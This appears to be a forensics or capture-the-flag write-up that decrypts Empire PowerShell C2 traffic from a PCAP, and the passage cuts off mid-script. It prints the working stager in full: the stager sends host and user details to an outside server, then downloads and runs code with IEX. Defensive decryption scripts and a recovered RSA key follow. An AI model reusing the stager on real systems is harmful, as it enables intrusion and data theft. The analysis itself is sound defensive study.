Decrypt-Bytes {param ($Key, $In)if($In.Length -gt 32) {$HMAC = New-Object System.Security.Cryptography.HMACSHA256;$e=[System.Text.Encoding]::ASCII;$Mac = $In[-10..-1];$In = $In[0..($In.length - 11)];$hmac.Key = $e.GetBytes($Key);$Expected = $hmac.ComputeHash($In)[0..9];if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {return;}$IV = $In[0..15];try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}$AES.Mode = "CBC";$AES.Key = $e.GetBytes($Key);$AES.IV = $IV;($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)}}$Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");$Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");$ErrorActionPreference = "SilentlyContinue";$e=[System.Text.Encoding]::UTF8;$customHeaders = "";$SKB=$e.GetBytes($SK);try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}$IV = [byte] 0..255 | Get-Random -count 16;$AES.Mode="CBC";$AES.Key=$SKB;$AES.IV = $IV;$hmac = New-Object System.Security.Cryptography.HMACSHA256;$hmac.Key = $SKB;$csp = New-Object System.Security.Cryptography.CspParameters;$csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;$rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;$rk=$rs.ToXmlString($False);$ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);$ib=$e.getbytes($rk);$eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);$eb=$eb+$hmac.ComputeHash($eb)[0..9];if(-not $wc) {$wc=New-Object System.Net.WebClient;$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;}if ($Script:Proxy) {$wc.Proxy = $Script:Proxy;}if ($customHeaders -ne "") {$headers = $customHeaders -split ',';$headers | ForEach-Object {$headerKey = $_.split(':')[0];$headerValue = $_.split(':')[1];if ($headerKey -eq "host"){try{$ig=$WC.DownloadData($s)}catch{}};$wc.Headers.Add($headerKey, $headerValue);}}$wc.Headers.Add("User-Agent",$UA);$IV=[BitConverter]::GetBytes($(Get-Random));$data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);$rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;$rc4p = $IV + $rc4p + $eb;$raw=$wc.UploadData($s+"/login/process.php","POST",$rc4p);$de=$e.GetString($rs.decrypt($raw,$false));$nonce=$de[0..15] -join '';$key=$de[16..$de.length] -join '';$nonce=[String]([long]$nonce + 1);try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}$IV = [byte] 0..255 | Get-Random -Count 16;$AES.Mode="CBC";$AES.Key=$e.GetBytes($key);$AES.IV = $IV;$i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;try{$p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);}catch {$p = "[FAILED]"}$ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};$i+="|$ip";try{$i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];}catch{$i+='|'+'[FAILED]'}if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}$n=[System.Diagnostics.Process]::GetCurrentProcess();$i+='|'+$n.ProcessName+'|'+$n.Id;$i += "|powershell|" + $PSVersionTable.PSVersion.Major;$i += "|" + $env:PROCESSOR_ARCHITECTURE;$ib2=$e.getbytes($i);$eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);$hmac.Key = $e.GetBytes($key);$eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];$IV2=[BitConverter]::GetBytes($(Get-Random));$data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);$rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;$rc4p2 = $IV2 + $rc4p2 + $eb2;if ($customHeaders -ne "") {$headers = $customHeaders -split ',';$headers | ForEach-Object {$headerKey = $_.split(':')[0];$headerValue = $_.split(':')[1];if ($headerKey -eq "host"){try{$ig=$WC.DownloadData($s)}catch{}};$wc.Headers.Add($headerKey, $headerValue);}}$wc.Headers.Add("User-Agent",$UA);$wc.Headers.Add("Hop-Name",$hop);$raw=$wc.UploadData($s+"/admin/get.php", "POST", $rc4p2);IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );$AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;[GC]::Collect();Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "" -KillDate "" -ProxySettings $Script:Proxy;}Start-Negotiate -s "$ser" -SK 'Td:b0uCNi#W}L7!@qFk](^f&.=?3re;G' -UA $u -hop "$hop";
```

## Analyse the decrypted powershell code, fetched from GET /admin/get.php
Let's clean it up to easier reading:
```sh
function ConvertTo-RC4ByteStream {
	 Param ($RCK, $In)begin
	 {
		[Byte[]] $Str = 0..255;$J = 0;0..255 | ForEach-Object {
			 $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
			 $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
		};
		$I = $J = 0;
	 }
	 process
	 {
		ForEach($Byte in $In) {
			      $I = ($I + 1) % 256;
			      $J = ($J + $Str[$I]) % 256;
			      $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
			      $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
		}
	}
}

function Decrypt-Bytes {
    param ($Key, $In)
    if($In.Length -gt 32)
    {
	# HMAC
	$HMAC = New-Object System.Security.Cryptography.HMACSHA256;
    	$Mac = $In[-10..-1];
    	$In = $In[0..($In.length - 11)];
    	$hmac.Key = [System.Text.Encoding]::ASCII.GetBytes($Key);
    	$Expected = $hmac.ComputeHash($In)[0..9];
    	if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {return;}

	# AES
	$IV = $In[0..15];
    	try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}
    	catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}
    	$AES.Mode = "CBC";
    	$AES.Key = [System.Text.Encoding]::ASCII.GetBytes($Key);
    	$AES.IV = $IV;
    	($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
    }
}

### Encode POST login/process.php ###
$SK='Td:b0uCNi#W}L7!@qFk](^f&.=?3re;G'
$SKB=[System.Text.Encoding]::UTF8.GetBytes($SK);

# AES
try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}
catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}
$IV = [byte] 0..255 | Get-Random -count 16;
$AES.Mode="CBC";
$AES.Key=$SKB;
$AES.IV = $IV;

$csp = New-Object System.Security.Cryptography.CspParameters;
$csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
$rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
$rk=$rs.ToXmlString($False);
$ib=[System.Text.Encoding]::UTF8.getbytes($rk);
$eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);

# HMAC
$hmac = New-Object System.Security.Cryptography.HMACSHA256;
$hmac.Key = $SKB;
$eb=$eb+$hmac.ComputeHash($eb)[0..9];

$IV=[BitConverter]::GetBytes($(Get-Random));
$ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);
$data = [System.Text.Encoding]::UTF8.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
$rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
$rc4p = $IV + $rc4p + $eb;
$raw=$wc.UploadData($s+"/login/process.php","POST",$rc4p);


### Decode response to POST login/process.php ###
$de=[System.Text.Encoding]::UTF8.GetString($rs.decrypt($raw,$false));
$nonce=$de[0..15] -join '';
$key=$de[16..$de.length] -join '';
$nonce=[String]([long]$nonce + 1);

### Encode POST admin/get.php ###
# Data (truncate)
$i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
$ib2=[System.Text.Encoding]::UTF8.getbytes($i);
# .....

# AES
try {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}
catch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}
$IV = [byte] 0..255 | Get-Random -Count 16;
$AES.Mode="CBC";
$AES.Key=[System.Text.Encoding]::UTF8.GetBytes($key);
$AES.IV = $IV;
$eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);

# HMAC
$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($key);
$eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];
$IV2=[BitConverter]::GetBytes($(Get-Random));
$data2 = [System.Text.Encoding]::UTF8.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
$rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
$rc4p2 = $IV2 + $rc4p2 + $eb2;

$raw=$wc.UploadData($s+"/admin/get.php", "POST", $rc4p2);

### Decode response to POST admin/get.php ###
Decrypt-Bytes -Key $key -In $raw;
```

Wow, there's a mixture of `RC4`, `RSA` and `AES` cryptographic functions.

Here's the format of the encrypted payloads sent by the victim:
- IV => 4bytes
- HEADER (RC4ByteStream encoded)
    - [System.Text.Encoding]::UTF8.getbytes($ID) => some random alphanumeric ID on 8bytes
    - @(0x01,0x02,0x00,0x00) => some magic bytes ?? on 4bytes
    - [BitConverter]::GetBytes($eb.Length) => the length of the following body, on 4bytes
- BODY (AES-CBC encoded)
    - IV => 16bytes
    - DATA => data, variable length
- HMAC => 10bytes

THe field `DATA` holds the `RSA public key` in the first `POST request /login/process.php`.

We can further break down the message flow as follow:
- victim sends a `GET request /admin/get.php` via infected binary `photoshop.exe`.
- attacker sends some powershell stager in response.
- stager sends a `POST request /login/process.php` with an `RSA public key` as data. It is `AES encrypted` using an initial `key` defined in the stager.
- attacker sends a `nonce` together with a `AES key` to be used from now on. It is `RSA encrypted`.
- stager sends a `POST request /admin/get.php` with some `system information` as data (like UserDomainName, UserName, MachineName): fields are concatanated and separated with `|`. It is `AES-encrypted` with the new `AES key`.
- After that, everything is `AES-encrypted` and the decryption function is available in the stager code.

`RSA` is used to securely transfer the `AES key`. `AES` is used to encrypt the data, once the staging phase is done. RC4 is used to encrypt the payload header.

In order to decrypt a payload sent by the victim, we shall skip 20 bytes (4 bytes for the `IV`, plus 16 bytes for the `header`) before the beginning of the body, which is AES-CBC encoded, and we can use function `Decrypt-Bytes()` to decrypt the data. It takes two arguments: the `IV` and the data itself. The initial AES key is also available.

We can test it out and recover the `RSA public key`, although this won't be of any use, since it's the `RSA private key` that we'll need (it encrypts the `AES key`), but we'll come to that later on.

## Decrypt data from POST /login/process.php (packet #255)
Let's try that out with `powershell` code below, where we have extracted the data from packet #255 in the `PCAP` file, skipped the offset of 20 bytes and recoved the `RSA public key`. Implemented in [dec_public_rsa.ps1](./dec_public_rsa.ps1).
```sh
$key='Td:b0uCNi#W}L7!@qFk](^f&.=?3re;G';
$offset = 2*20

#-----------------------------------------------------------------------
# AES-encoded RSA Public key, from POST /login/process.php
# Packet #255
#-----------------------------------------------------------------------
$data_hex='f493370a6f958180cb20b108821d482c2acc8d87f0920d5a1e6ca3783b86be346a755fcea148175f6df53a5ed02f2148c32494bcca320abf5b0ddcc1603038d03e692a071d163b459a1a64a709391f2473bd3e876c33f3dea007fdc35a3eafacad2a49a1b1edf67232eb8df64e009fcc4993a4878df22a0fe9940bbdc14e1d89be2732fd4d90ef5b7b9f46b3b9453c143f3a85e5c74b5d86f64aa603fa6a0249ff8a916f30b6243f3ee37bce473a9a46e5a89d345beb9638742650a459a043ac9e0671f93e64d1948229b593afc6084c5f649d71af5e9d83fc0790f467502245a489c7fc12e8979990fd73a3ec84a024e64b4ae40c48559b23b884f6ba4707ceb9fc0a05ea60a1606a03deccd663ff0fbf5789befc707c73792b8f9859a023fa5da9f9f1b46f2a4b2185eae585350ad682d161d230c962f4e8dbd734e20e55a3742aaa98f55f2248a24e741779b9cbe38cfb436fed1834f139ebbb784d2057c1e3e33df8156a78605c985c73eb56bd8de9eff1b0749649b0ea29a08189ccbb29c2a51abd217a18d0cdaf02c2646b04ea6cdf72fbd6d9612180471b33542002e418e102f2fd2164c7145daca5161f06d44dc7edd01e66694072e19e3b2dc95b1544a68040bcb2fd044c7c7e1ca2f7'
$data=-join $data_hex[$offset..$data_hex.length]
$data=[Convert]::FromHexString($data)

$result = Decrypt-Bytes -Key $key -In $data
$rsa_key=[System.Text.Encoding]::UTF8.GetString($result)

Write-Output '## Decoded RSA Public key (was AES-encoded in POST /login/process.php):'
Write-Output $rsa_key
Write-Output ''
```

```console
$ pwsh -file dec_public_rsa.ps1
<RSAKeyValue><Modulus>tMWn/H1EhPpLFO9SQwv6qyZrSuUqx4Dv8YUqlDkCvIjr3q1H71Di/2HHZIKRdl6pvV2xAAZVHsAP3YFL4iVMvQPvL8JVvQj6lD46AmNdkt6q7bGtiywK+k7gManNzC9GpTKxYZMgN0jFcV9nZ2dNfIWi1L4jVXsy5DRjUb8tMpVsxmkVNs+H+pWqgLx0Uc1NhN083sLK27MEmL5iFDLdvKVFsT+s5H10Ex2yA+3H+uAVc7luz/zIhLAlq5Ogk0plKB/6E1JlEGQAuq/UkjELp25039KSMjOezQgiGG2gfNTwRkPyXNPekY1pQVjK5VHr2SP55UXuRNrca8hTtxSEvQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
```

So the decryption works, we can even transform it to `PEM format` if we want to. Implemented in [rsa.py](./rsa.py):
```python
from Crypto.PublicKey import RSA

n = 0xb4c5a7fc7d4484fa4b14ef52430bfaab266b4ae52ac780eff1852a943902bc88ebdead47ef50e2ff61c7648291765ea9bd5db10006551ec00fdd814be2254cbd03ef2fc255bd08fa943e3a02635d92deaaedb1ad8b2c0afa4ee031a9cdcc2f46a532b16193203748c5715f6767674d7c85a2d4be23557b32e4346351bf2d32956cc6691536cf87fa95aa80bc7451cd4d84dd3cdec2cadbb30498be621432ddbca545b13face47d74131db203edc7fae01573b96ecffcc884b025ab93a0934a65281ffa135265106400baafd492310ba76e74dfd29232339ecd0822186da07cd4f04643f25cd3de918d694158cae551ebd923f9e545ee44dadc6bc853b71484bd

e = 0x010001

rsa = RSA.construct((n, e))
key = rsa.export_key()
print(key.decode())
```

```console
$ python3 rsa.py
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtMWn/H1EhPpLFO9SQwv6
qyZrSuUqx4Dv8YUqlDkCvIjr3q1H71Di/2HHZIKRdl6pvV2xAAZVHsAP3YFL4iVM
vQPvL8JVvQj6lD46AmNdkt6q7bGtiywK+k7gManNzC9GpTKxYZMgN0jFcV9nZ2dN
fIWi1L4jVXsy5DRjUb8tMpVsxmkVNs+H+pWqgLx0Uc1NhN083sLK27MEmL5iFDLd
vKVFsT+s5H10Ex2yA+3H+uAVc7luz/zIhLAlq5Ogk0plKB/6E1JlEGQAuq/UkjEL
p25039KSMjOezQgiGG2gfNTwRkPyXNPekY1pQVjK5VHr2SP55UXuRNrca8hTtxSE
vQIDAQAB
-----END PUBLIC KEY-----
```

Anyways, we need to chase the `RSA private key` now if we want to decrypt the exfiltered data, because the `RSA private key` is used to securely transfer the `AES key`...

## Looking for the RSA private key
Switching to `Volatility3`, we can recover it using script `symcrypt.Symcrypt` from https://github.com/daddycocoaman/volplugins.git:
```console
$ python3 vol.py -f ../cesar.raw symcrypt.Symcrypt --pid 8112                                       
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished
Offset          PID     Process         Rule    HasPrivateKey   Modulus (First 20 Bytes)        Matching

0x1eba40d0      8112    photoshop.exe   symcrypt_rsa_key        1       B4C5A7FC7D4484FA4B14EF52430BFAAB266B4AE5

$ ls B4C5A7FC7D4484FA4B14EF52430BFAAB266B4AE5*
B4C5A7FC7D4484FA4B14EF52430BFAAB266B4AE5_modulus.key.der
B4C5A7FC7D4484FA4B14EF52430BFAAB266B4AE5_modulus.key.pem
B4C5A7FC7D4484FA4B14EF52430BFAAB266B4AE5_modulus.key.xml

$ cat B4C5A7FC7D4484FA4B14EF52430BFAAB266B4AE5_modulus.key.pem
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQC0xaf8fUSE+ksU
71JDC/qrJmtK5SrHgO/xhSqUOQK8iOverUfvUOL/YcdkgpF2Xqm9XbEABlUewA/d
gUviJUy9A+8vwlW9CPqUPjoCY12S3qrtsa2LLAr6TuAxqc3ML0alMrFhkyA3SMVx
X2dnZ018haLUviNVezLkNGNRvy0ylWzGaRU2z4f6laqAvHRRzU2E3TzewsrbswSY
vmIUMt28pUWxP6zkfXQTHbID7cf64BVzuW7P/MiEsCWrk6CTSmUoH/oTUmUQZAC6
r9SSMQunbnTf0pIyM57NCCIYbaB81PBGQ/Jc096RjWlBWMrlUevZI/nlRe5E2txr
yFO3FIS9AgMBAAECggEBAIIS+5ZFuOkKhL4Smpmd5AgFBA0HKyoU0BJ0pLe08hAh
Yb9/5hQAmuXyQJxFC1AmO3MEGJmQ9OzEfGYBZE3cUwRq8U/nQPRdopjK0cjoIOvO
hyWzxNEwptGHsfBqY6f5mJbEDDjOuc6t8Uxrvqb8ARiJvCniiuA2Xt8wBwtKScZr
4jj+dQMkAiykGmpS32S54Es3k9ymd4dAH9qwdCwko9w5TcbuDyu7llsSJX/R8gCc
EztK4HnoBNvlpXb3XT58Auq4aK+N29nOBMbGFQpOsWK3unVGkye3r3R0UTIzJB5E
4N/Tyc6v5sUhEfNsY+5kfaKTKIXt6j6fiodfrjWiIQ0CgYEA6AlvHE86YJSlWDv1
PQqtxEyB0FJQzkH416DbMAerMhMesetkvYMNxD42xYdABjtbgsYZqVT7Bxji+2Cp
3lmooOxCW7E83V7sVa+FND7PdKCTtIuFIt1bJYIzHfy9FPKPOt97kBPZLP0dOCYi
O3FJhhVxtxNCbnhXZCF1vAn0o0sCgYEAx3Djz/l/ROpyHX/n3vX9fL02ucq/lU4i
hQchKL2vVn4S3XMXLTFP+Nf/xImfq54p5g+Hl+Wn6YoZ/soR5EkTOUF87+1uBq6/
lujoK2EL8CAY4w53w+4oXHnk/pnGMWJHfm1JwxeQSgcXvI+TLVNh6SjjUGF2yXq3
J8zBmawc6xcCgYB0zXrvBzrdrzXkSppSlfOO4uxdz3H5wd/fu4tajCGzXUiQS2w0
sanWZXLwz/p8qJiSJeJ5CNwsYGyyGaCo2v01tHha68c1sDjLkUU+XXfUv5haw/jK
6h6drQLKT5Vm3AsZmbH7fuJN8UQqJZgJ0Ccwpc7OV5WTQmTLdMRtWZ2aLQKBgQCF
ECeeYZrtEvJyBh1gn4SxTdiOWtw5tDjJwnj4Ip4yOclCYIAtEcKGhy5JJX0XVl4j
9WaFDJ9b7FztpkoLokmmILBHr4SCBuMiv1/vWT9KxU91Zfi4C1R4ZodG6rfVyPlk
O2xEMpt9GIBYuP379q7TjgkjXvOO90Xt0um0KqXcnwKBgQDKkkNkol1ZKJLRrldM
s1IaqD/XL9QiAsB9COeKasjeakkQIBynflKz1rz06TtuneRqRW+qLkK4r8dYjZQO
/fD/xiwCxoS/NIB/w7kO4MgM6kcbbw6aZiytd3xNswOxPgkVQ0EDt+G1xZiDs4cr
QehQPFRPcrbn9Kat8wqths2n5Q==
-----END PRIVATE KEY-----

$ cat B4C5A7FC7D4484FA4B14EF52430BFAAB266B4AE5_modulus.key.xml
<RSAKeyValue><Modulus>tMWn/H1EhPpLFO9SQwv6qyZrSuUqx4Dv8YUqlDkCvIjr3q1H71Di/2HHZIKRdl6pvV2xAAZVHsAP3YFL4iVMvQPvL8JVvQj6lD46AmNdkt6q7bGtiywK+k7gManNzC9GpTKxYZMgN0jFcV9nZ2dNfIWi1L4jVXsy5DRjUb8tMpVsxmkVNs+H+pWqgLx0Uc1NhN083sLK27MEmL5iFDLdvKVFsT+s5H10Ex2yA+3H+uAVc7luz/zIhLAlq5Ogk0plKB/6E1JlEGQAuq/UkjELp25039KSMjOezQgiGG2gfNTwRkPyXNPekY1pQVjK5VHr2SP55UXuRNrca8hTtxSEvQ==</Modulus><Exponent>AQAB</Exponent><P>6AlvHE86YJSlWDv1PQqtxEyB0FJQzkH416DbMAerMhMesetkvYMNxD42xYdABjtbgsYZqVT7Bxji+2Cp3lmooOxCW7E83V7sVa+FND7PdKCTtIuFIt1bJYIzHfy9FPKPOt97kBPZLP0dOCYiO3FJhhVxtxNCbnhXZCF1vAn0o0s=</P><Q>x3Djz/l/ROpyHX/n3vX9fL02ucq/lU4ihQchKL2vVn4S3XMXLTFP+Nf/xImfq54p5g+Hl+Wn6YoZ/soR5EkTOUF87+1uBq6/lujoK2EL8CAY4w53w+4oXHnk/pnGMWJHfm1JwxeQSgcXvI+TLVNh6SjjUGF2yXq3J8zBmawc6xc=</Q><DP>dM167wc63a815EqaUpXzjuLsXc9x+cHf37uLWowhs11IkEtsNLGp1mVy8M/6fKiYkiXieQjcLGBsshmgqNr9NbR4WuvHNbA4y5FFPl131L+YWsP4yuoena0Cyk+VZtwLGZmx+37iTfFEKiWYCdAnMKXOzleVk0Jky3TEbVmdmi0=</DP><DQ>hRAnnmGa7RLycgYdYJ+EsU3YjlrcObQ4ycJ4+CKeMjnJQmCALRHChocuSSV9F1ZeI/VmhQyfW+xc7aZKC6JJpiCwR6+EggbjIr9f71k/SsVPdWX4uAtUeGaHRuq31cj5ZDtsRDKbfRiAWLj9+/au044JI17zjvdF7dLptCql3J8=</DQ><InverseQ>ypJDZKJdWSiS0a5XTLNSGqg/1y/UIgLAfQjnimrI3mpJECAcp35Ss9a89Ok7bp3kakVvqi5CuK/HWI2UDv3w/8YsAsaEvzSAf8O5DuDIDOpHG28OmmYsrXd8TbMDsT4JFUNBA7fhtcWYg7OHK0HoUDxUT3K25/SmrfMKrYbNp+U=</InverseQ><D>ghL7lkW46QqEvhKamZ3kCAUEDQcrKhTQEnSkt7TyECFhv3/mFACa5fJAnEULUCY7cwQYmZD07MR8ZgFkTdxTBGrxT+dA9F2imMrRyOgg686HJbPE0TCm0Yex8Gpjp/mYlsQMOM65zq3xTGu+pvwBGIm8KeKK4DZe3zAHC0pJxmviOP51AyQCLKQaalLfZLngSzeT3KZ3h0Af2rB0LCSj3DlNxu4PK7uWWxIlf9HyAJwTO0rgeegE2+WldvddPnwC6rhor43b2c4ExsYVCk6xYre6dUaTJ7evdHRRMjMkHkTg39PJzq/mxSER82xj7mR9opMohe3qPp+Kh1+uNaIhDQ==</D></RSAKeyValue>
```

## Decode data from response to  POST /login/process.php (packet #258)
We use the extracted `RSA private key` (in XML format) to decrypt the `AES key` in packet #258 from the `PCAP` file. Implemented in [dec_aes_key.ps1](./dec_aes_key.ps1):
```sh
#-----------------------------------------------------------------------
# RSA Private key (extracted from process memory)
#-----------------------------------------------------------------------
$rsa_private_key='<RSAKeyValue><Modulus>tMWn/H1EhPpLFO9SQwv6qyZrSuUqx4Dv8YUqlDkCvIjr3q1H71Di/2HHZIKRdl6pvV2xAAZVHsAP3YFL4iVMvQPvL8JVvQj6lD46AmNdkt6q7bGtiywK+k7gManNzC9GpTKxYZMgN0jFcV9nZ2dNfIWi1L4jVXsy5DRjUb8tMpVsxmkVNs+H+pWqgLx0Uc1NhN083sLK27MEmL5iFDLdvKVFsT+s5H10Ex2yA+3H+uAVc7luz/zIhLAlq5Ogk0plKB/6E1JlEGQAuq/UkjELp25039KSMjOezQgiGG2gfNTwRkPyXNPekY1pQVjK5VHr2SP55UXuRNrca8hTtxSEvQ==</Modulus><Exponent>AQAB</Exponent><P>6AlvHE86YJSlWDv1PQqtxEyB0FJQzkH416DbMAerMhMesetkvYMNxD42xYdABjtbgsYZqVT7Bxji+2Cp3lmooOxCW7E83V7sVa+FND7PdKCTtIuFIt1bJYIzHfy9FPKPOt97kBPZLP0dOCYiO3FJhhVxtxNCbnhXZCF1vAn0o0s=</P><Q>x3Djz/l/ROpyHX/n3vX9fL02ucq/lU4ihQchKL2vVn4S3XMXLTFP+Nf/xImfq54p5g+Hl+Wn6YoZ/soR5EkTOUF87+1uBq6/lujoK2EL8CAY4w53w+4oXHnk/pnGMWJHfm1JwxeQSgcXvI+TLVNh6SjjUGF2yXq3J8zBmawc6xc=</Q><DP>dM167wc63a815EqaUpXzjuLsXc9x+cHf37uLWowhs11IkEtsNLGp1mVy8M/6fKiYkiXieQjcLGBsshmgqNr9NbR4WuvHNbA4y5FFPl131L+YWsP4yuoena0Cyk+VZtwLGZmx+37iTfFEKiWYCdAnMKXOzleVk0Jky3TEbVmdmi0=</DP><DQ>hRAnnmGa7RLycgYdYJ+EsU3YjlrcObQ4ycJ4+CKeMjnJQmCALRHChocuSSV9F1ZeI/VmhQyfW+xc7aZKC6JJpiCwR6+EggbjIr9f71k/SsVPdWX4uAtUeGaHRuq31cj5ZDtsRDKbfRiAWLj9+/au044JI17zjvdF7dLptCql3J8=</DQ><InverseQ>ypJDZKJdWSiS0a5XTLNSGqg/1y/UIgLAfQjnimrI3mpJECAcp35Ss9a89Ok7bp3kakVvqi5CuK/HWI2UDv3w/8YsAsaEvzSAf8O5DuDIDOpHG28OmmYsrXd8TbMDsT4JFUNBA7fhtcWYg7OHK0HoUDxUT3K25/SmrfMKrYbNp+U=</InverseQ><D>ghL7lkW46QqEvhKamZ3kCAUEDQcrKhTQEnSkt7TyECFhv3/mFACa5fJAnEULUCY7cwQYmZD07MR8ZgFkTdxTBGrxT+dA9F2imMrRyOgg686HJbPE0TCm0Yex8Gpjp/mYlsQMOM65zq3xTGu+pvwBGIm8KeKK4DZe3zAHC0pJxmviOP51AyQCLKQaalLfZLngSzeT3KZ3h0Af2rB0LCSj3DlNxu4PK7uWWxIlf9HyAJwTO0rgeegE2+WldvddPnwC6rhor43b2c4ExsYVCk6xYre6dUaTJ7evdHRRMjMkHkTg39PJzq/mxSER82xj7mR9opMohe3qPp+Kh1+uNaIhDQ==</D></RSAKeyValue>'

Write-Output '## RSA Private key (extracted from process memory):'
Write-Output $rsa_private_key
Write-Output ''

$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider
$key = $rsa.FromXmlString($rsa_private_key)

#-----------------------------------------------------------------------
# RSA-encoded AES-key from response POST /login/process.php
# Packet #258
#-----------------------------------------------------------------------
$data_hex='6622a71780d80248b75e3f389121d22d5cdedb383472497b21f4d84e811544dfeaa7f76e9191994f223b60500ced6289c17ba70f20232ec04b9b754cafa13e2a810a5e754494241ba2bc1413c51b77bacacb9a04f3647bbc3d54dcf669b4dadbd77002823106686ee9746169ad26ff6226ea2b07c38e80f393bd4a20bfc72d6b7295d9fc30ecfd1181a1991f3bebff1a779782fe09fc029c86ead206a3b6982308f4a73c5194f8ac904db0b8a3c17f9f766e85301aac00beffb03fb874ce4ca14a76084105723bb8a7572cea47f2d3cd64a45cf7398bc609dd6c03dc0f75ca4d8d9a72fde5d5d58edd55aa8ce88a777a964ec3bed07afaa362dac2fd0f48364e'
$data=[Convert]::FromHexString($data_hex)

$dec=[char[]]$rsa.decrypt($data,$false)
$de=[System.Text.Encoding]::UTF8.GetString($dec);
$aes_key=$de[16..$de.length] -join '';

Write-Output '## Decoded AES key (was RSA-encoded in response to POST /login/process.php:'
Write-Output $aes_key
Write-Output ''
```

And it works!
```console
$ pwsh -File dec_aes_key.ps1
## Decoded AES key (was RSA-encoded in response to POST /login/process.php:
e\Z6a3xGr|B-n?9u@5iN8)/q4w&{b+0m

```

Now we have the `AES key`, so we can decrypt the following `POST requests` and analyse what was exfiltrated.

## Decode exfiltrated data in POST /admin/get.php
### Exfil #1 - Packet #267
We use the `AES key` to decode the exfiltrated data in the following `POST request /admin/get.php`. Implemented in [exfil.ps1](./exfil.ps1):
```sh
$aes_key='e\Z6a3xGr|B-n?9u@5iN8)/q4w&{b+0m'

#-----------------------------------------------------------------------
# Exfil #1
# Packet #267
#-----------------------------------------------------------------------
$data_hex='331f07390a6228d41e91753dfee91269e6e49e74ac97bc46b618b89df494a448bb29b4c1e10f70a93856bb9fd0895d1dcf881e88cfe69bb9f866033d23a8508aaa705c0e4e0998a7decd4d8f55b1fde96c59d4725cc008cbaa8d8f5e54014565b0b9e3d1e031083a5cac3763b318b8d1daa65bbc8b89fc07590f479dbecafabcf5051a662d6aa3d335652c022df21b79a97ea5b3f2cd17fbab86d18e84abcf56cc453c0798c503ec846803218055bd29c8e67f81bdcc5ee640ea7db34498'
$data=-join $data_hex[$offset..$data_hex.length]
$data=[Convert]::FromHexString($data)

